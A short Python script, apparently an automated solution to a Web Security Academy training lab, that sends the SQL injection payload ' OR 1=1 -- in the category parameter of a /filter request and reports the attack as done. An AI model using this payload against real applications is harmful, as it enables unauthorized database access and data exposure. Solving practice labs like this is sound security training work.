from web_security_academy.core.utils import *
from urllib.parse import urlencode


def solve_lab(session):
    params = {"category": "' OR 1=1 --"}
    print_info(
        f'Performing SQL injection attack by visiting "/filter?{urlencode(params)}"'
    )
    session.get_path("/filter", params=params)
    print_success("SQL injection attack performed.\n")
